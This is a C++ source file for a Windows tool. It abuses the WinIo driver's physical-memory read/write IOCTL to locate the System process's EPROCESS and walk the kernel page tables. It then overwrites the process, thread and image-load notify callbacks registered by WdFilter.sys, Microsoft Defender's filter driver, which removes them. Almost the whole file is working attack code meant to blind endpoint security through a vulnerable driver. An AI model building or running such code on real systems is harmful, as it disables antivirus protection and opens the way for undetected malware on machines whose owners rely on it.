// winio64.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>
#include <stdio.h>
#include <psapi.h>

#define DEVICE_NAME L"\\\\.\\WinIo"
#define IOCTL_READ_PHYS_MEM 0x80102040
#define IOCTL_UNMAP_PHYS_MEM 0x80102044

#define OFFSET_IMAGEFILENAME 0x338
#define OFFSET_UNIQUEPROCESSID 0x1d0
#define OFFSET_DIRTABLEBASE 0x28
#define OFFSET_PspCreateProcessNotifyRoutine 0x00f04cc0
#define OFFSET_PspCreateThreadNotifyRoutine 0x00f04ac0
#define OFFSET_PspLoadImageNotifyRoutine 0x00f048c0

HANDLE hDevice = NULL;
LPVOID nt_addr = NULL;
DWORD64 DirBase = NULL;

typedef struct _PHYSICAL_MEMORY_READ {
    DWORD64 Size;
    DWORD64 PhysicalAddress;
    DWORD Padding;
    PVOID VirtualAddress;
    PVOID Padding0;
} PHYSICAL_MEMORY_READ;

typedef struct _PHYSICAL_MEMORY_WRITE {
    DWORD64 Size;
    DWORD64 PhysicalAddress;
    DWORD Padding;
    PVOID VirtualAddress;
    PVOID Padding0;
} PHYSICAL_MEMORY_WRITE;

PVOID GetBase(LPCWSTR name)
{
    BOOL status;
    LPVOID* pImageBase;
    DWORD ImageSize;
    WCHAR driverName[1024];
    LPVOID driverBase = nullptr;

    status = EnumDeviceDrivers(nullptr, 0, &ImageSize);

    pImageBase = (LPVOID*)VirtualAlloc(nullptr, ImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    status = EnumDeviceDrivers(pImageBase, ImageSize, &ImageSize);

    int driver_count = ImageSize / sizeof(pImageBase[0]);

    for (int i = 0; i < driver_count; i++) {
        GetDeviceDriverBaseNameW(pImageBase[i], driverName, sizeof(driverName) / sizeof(char));

        if (!wcscmp(name, driverName)) {
            driverBase = pImageBase[i];
            break;
        }
    }

    return driverBase;
}

BOOL PhysicalWrite(DWORD64 PhysicalAddr, PVOID Data, DWORD64 Size) {
    PHYSICAL_MEMORY_WRITE request = { 0 };
    request.Size = Size;
    request.PhysicalAddress = PhysicalAddr;

    DWORD bytesReturned = 0;

    BOOL success = DeviceIoControl(
        hDevice,
        IOCTL_READ_PHYS_MEM,
        &request,
        sizeof(request),
        &request,
        sizeof(request),
        &bytesReturned,
        NULL
    );

    if (!success) {
        printf("[!] Failed to read physical memory: 0x%llx! Error: 0x%X\n", PhysicalAddr, GetLastError());
        CloseHandle(hDevice);
        return FALSE;
    }

    memcpy(request.VirtualAddress, &Data, request.Size);
    // printf("[+] Successfully write %llu bytes to physical memory\n", Size);

    success = DeviceIoControl(
        hDevice,
        IOCTL_UNMAP_PHYS_MEM,
        &request,
        sizeof(request),
        &request,
        sizeof(request),
        &bytesReturned,
        NULL
    );

    if (!success) {
        printf("[!] Failed to unmap the virtual memory of: 0x%llx! Error: 0x%X\n", PhysicalAddr, GetLastError());
        CloseHandle(hDevice);
        return FALSE;
    }

    return TRUE;
}

PVOID PhysicalRead(DWORD64 PhysicalAddr, DWORD64 Size) {
    PHYSICAL_MEMORY_READ request = { 0 };
    request.Size = Size;
    request.PhysicalAddress = PhysicalAddr;

    void* buffer = malloc(Size);
    DWORD bytesReturned = 0;

    BOOL success = DeviceIoControl(
        hDevice,
        IOCTL_READ_PHYS_MEM,
        &request,
        sizeof(request),
        &request,
        sizeof(request),
        &bytesReturned,
        NULL
    );

    if (!success) {
        printf("[!] Failed to read physical memory: 0x%llx! Error: 0x%X\n", PhysicalAddr, GetLastError());
        CloseHandle(hDevice);
        free(buffer);
        return NULL;
    }

    memcpy(buffer, request.VirtualAddress, request.Size);
    // printf("[+] Successfully read %llu bytes from physical memory\n", Size);

    success = DeviceIoControl(
        hDevice,
        IOCTL_UNMAP_PHYS_MEM,
        &request,
        sizeof(request),
        &request,
        sizeof(request),
        &bytesReturned,
        NULL
    );

    if (!success) {
        printf("[!] Failed to unmap the virtual memory of: 0x%llx! Error: 0x%X\n", PhysicalAddr, GetLastError());
        CloseHandle(hDevice);
        return NULL;
    }

    return buffer;
}

BOOL VirtualToPhysical(DWORD64 VirtualAddr, DWORD64* PhysicalAddress) {
    DWORD64 VA = (DWORD64)VirtualAddr;

    WORD PML4 = ((VA >> 39) & 0x1FF);		// Page Map Level 4 index
    WORD PDPT = ((VA >> 30) & 0x1FF);		// Page-Directory-Pointer Table index
    WORD PDT = ((VA >> 21) & 0x1FF);		// Page Directory Table index
    WORD PT = ((VA >> 12) & 0x1FF);		    // Page Table index / byte offset within the physical page

    DWORD64 PML4E = 0;						// PML4 Entry
    DWORD64 PDPTE = 0;						// PDPT Entry
    DWORD64 PDTE = 0;						// PDT Entry
    DWORD64 PTE = 0;						// PT Entry

    // read up Page Map Level 4 Entry
    PML4E = (DWORD64)PhysicalRead(DirBase + PML4 * sizeof(DWORD64), sizeof(PML4E));
    PML4E = *(DWORD64*)PML4E;
    
    //printf("PML4E = %llX\n", PML4E);
    if (PML4E == 0) {
        *PhysicalAddress = 0;
        return TRUE;
    }

    // read up Page-Directory-Pointer Table Entry
    PDPTE = (DWORD64)PhysicalRead((PML4E & 0xFFFFFFFFFF000) + PDPT * sizeof(DWORD64), sizeof(PDPTE));
    PDPTE = *(DWORD64*)PDPTE;

    // printf("PDPTE = %llX\n", PDPTE);
    if (PDPTE == 0) {
        *PhysicalAddress = 0;
        return TRUE;
    }

    // if PS flag is set to 1 in PDPTE, we have LARGE PAGES in use (1 GB each)
    if ((PDPTE & (1 << 7)) != 0) {
        *PhysicalAddress = (PDPTE & 0xFFFFFC0000000) + (VA & 0x3FFFFFFF);
        return TRUE;
    }

    // read up Page Directory Table Entry
    PDTE = (DWORD64)PhysicalRead((PDPTE & 0xFFFFFFFFFF000) + PDT * sizeof(DWORD64), sizeof(PDTE));
    PDTE = *(DWORD64*)PDTE;

    // printf("PDTE = %llX\n", PDTE);
    if (PDTE == 0) {
        *PhysicalAddress = 0;
        return TRUE;
    }

    // if PS flag is set to 1 in PDTE, we have LARGE PAGES in use (2 MB each)
    if ((PDTE & (1 << 7)) != 0) {
        *PhysicalAddress = (PDTE & 0xFFFFFFFE00000) + (VA & 0x1FFFFF);
        return TRUE;
    }

    // read up Page Table Entry
    PTE = (DWORD64)PhysicalRead((PDTE & 0xFFFFFFFFFF000) + PT * sizeof(DWORD64), sizeof(PTE));
    PTE = *(DWORD64*)PTE;

    // printf("PTE = %llX\n", PTE);
    if (PTE == 0) {
        *PhysicalAddress = 0;
        return TRUE;
    }

    // return the PA for VA
    *PhysicalAddress = (PTE & 0xFFFFFFFFFF000) + (VA & 0xFFF);

    return TRUE;
}

PVOID MemorySearch(PVOID StartAddress, DWORD BlockSize, const char* ProcName) {
    BYTE* address = (BYTE*)StartAddress;
    size_t ProcLength = strlen(ProcName);

    for (DWORD i = 0; i <= BlockSize - ProcLength; i++) {
        if (memcmp(&address[i], ProcName, ProcLength) == 0) {
            // printf("[+] Found \"%s\" at offset: 0x%X\n", ProcName, i);
            return &address[i];
        }
    }
    // printf("[-] \"%s\" not found in the memory block.\n", ProcName);
    return NULL;
}

PVOID FindEPROC() {
    DWORD64 StartAddress = 0x100000000;
    DWORD64 StopAddress = 0x150000000;
    const DWORD BlockSize = 0x1000;
    DWORD pid = 0x4;
    char ProcName[] = "System";
    DWORD64 EProcPA = 0;
    DWORD NamePidDiff = OFFSET_IMAGEFILENAME - OFFSET_UNIQUEPROCESSID;

    for (DWORD64 SearchAddress = StartAddress; SearchAddress < StopAddress; SearchAddress += BlockSize) {
        void* buffer = PhysicalRead(SearchAddress, BlockSize);
        if (buffer != NULL) {
            void* Location = MemorySearch(buffer, BlockSize, ProcName);
            if (Location) {
                // Calculate the address of the UniqueProcessId field
                DWORD64* PidAddress = (DWORD64*)((BYTE*)Location - NamePidDiff);

                // Check if PID matches and ActiveProcessLinks looks valid
                if ((pid == *PidAddress) &&
                    ((*(PidAddress + 1) & 0xFFFF000000000000) != 0) && // Flink
                    ((*(PidAddress + 2) & 0xFFFF000000000000) != 0)) { // Blink
                    EProcPA = SearchAddress + ((BYTE*)Location - (BYTE*)buffer - OFFSET_IMAGEFILENAME);
                    free(buffer);
                    return (PVOID)EProcPA;
                }
            }
            free(buffer);
        }
    }

    printf("[-] Failed to find EPROCESS for PID %d\n", pid);
    return NULL;
}

BOOL FindDriverName(DWORD64 DriverAddress, char * DriverName, DWORD DriverSize) {
    BOOL ret = FALSE;
    LPVOID Drivers[1000] = { 0 };
    DWORD cbNeeded;
    DWORD64 Diff = -1;		// max possible == 0xffffffffffffffff

    // find the driver closest to the given Address
    if (EnumDeviceDrivers(Drivers, sizeof(Drivers), &cbNeeded)) {
        int NoDrivers = cbNeeded / sizeof(Drivers[0]);
        for (int i = 0; i < NoDrivers; i++) {
            if ((DWORD64)Drivers[i] <= DriverAddress) {
                DWORD64 CurrentDiff = DriverAddress - (DWORD64)Drivers[i];

                // if smaller difference found, store it
                if (CurrentDiff < Diff) {
                    Diff = CurrentDiff;
                }
            }
        }
    }
    if (Diff != -1)
        if (GetDeviceDriverBaseNameA((LPVOID)(DriverAddress - Diff), (LPSTR)DriverName, DriverSize))
            ret = TRUE;

    return ret;
}

BOOL FindNotifyRoutine(char* TargetName, char* NotificationType) {
    DWORD64 PhysicalAddress = 0;
    DWORD64 NotificationAddress = 0;
    if (!_stricmp(NotificationType, "PspCreateProcessNotifyRoutine"))
        NotificationAddress = (DWORD64)nt_addr + OFFSET_PspCreateProcessNotifyRoutine;
    if (!_stricmp(NotificationType, "PspCreateThreadNotifyRoutine"))
        NotificationAddress = (DWORD64)nt_addr + OFFSET_PspCreateThreadNotifyRoutine;
    if (!_stricmp(NotificationType, "PspLoadImageNotifyRoutine"))
        NotificationAddress = (DWORD64)nt_addr + OFFSET_PspLoadImageNotifyRoutine;

    VirtualToPhysical(NotificationAddress, &PhysicalAddress);
    if (PhysicalAddress != 0) {
        printf("[+] Found Physical Address of %s 0x%llx\n", NotificationType, PhysicalAddress);
    }

    printf("[+] Searching for %s Callbacks:\n", NotificationType);
    for (int i = 0; i < 64; i++) {
        DWORD64 NotifyCallback = (DWORD64)PhysicalRead((DWORD64)PhysicalAddress + (i * sizeof(DWORD64)), 8);
        NotifyCallback = *(DWORD64*)NotifyCallback;
        if (NotifyCallback) {
            DWORD64 NotifyPhysical = 0;
            VirtualToPhysical((NotifyCallback & -0x10) + 8, &NotifyPhysical); //  _EX_CALLBACK_ROUTINE_BLOCK.Function
            DWORD64 NotifyFunction = (DWORD64)PhysicalRead(NotifyPhysical, 8);
            NotifyFunction = *(DWORD64*)NotifyFunction;
            char DriverName[100];
            memset(DriverName, 0, sizeof(DriverName));
            if (!(FindDriverName(NotifyFunction, DriverName, sizeof(DriverName))))
                strcpy_s(DriverName, sizeof(DriverName), "NULL");
            printf("[*]\t Registered Callback Function: 0x%llx | Driver: %s", NotifyFunction, DriverName);

            if (!_stricmp(DriverName, TargetName)) {
                PVOID Data = 0; // Remove Callback
                BOOL res = PhysicalWrite((DWORD64)PhysicalAddress + (i * sizeof(DWORD64)), Data, sizeof(DWORD64));

                if (res) {
                    printf(" [REMOVED] ");
                } else {
                    printf(" [UNABLE TO REMOVE] ");
                }

            }
            printf("\n");
        }
    }

    return TRUE;
}

int main() {

    printf("[+] Opening handle to driver\n");
    hDevice = CreateFileW(
        DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[!] Failed to open device! Error: 0x%X\n", GetLastError());
        return 1;
    }

    PVOID EProcPA = FindEPROC();
    if (EProcPA != NULL) {
        printf("[+] System.exe's EPROCESS physical address: 0x%llx\n", (DWORD64)EProcPA);
    }
    else {
        printf("[-] Failed to find System.exe EPROCESS address\n");
        return 1;
    }
    
    void* buffer = PhysicalRead((DWORD64)EProcPA + OFFSET_DIRTABLEBASE, 8);
    if (buffer) {
        DirBase = *(DWORD64*)buffer;
        DirBase = DirBase & -0x3;
        printf("[+] DirBase Address: 0x%llx\n", DirBase);
    }
    else {
        printf("[-] Failed to find the DirBase Address\n");
        return 1;
    }

    nt_addr = GetBase(L"ntoskrnl.exe");
    printf("[+] Nt Base Address: 0x%p\n", nt_addr);

    char DriverName[100] = { 0 };
    strcpy_s(DriverName, sizeof(DriverName), "WdFilter.sys");

    printf("\n");
    FindNotifyRoutine(DriverName, (char*)"PspCreateProcessNotifyRoutine");

    printf("\n");
    FindNotifyRoutine(DriverName, (char*)"PspCreateThreadNotifyRoutine");

    printf("\n");
    FindNotifyRoutine(DriverName, (char*)"PspLoadImageNotifyRoutine");

    CloseHandle(hDevice);
    return 0;
}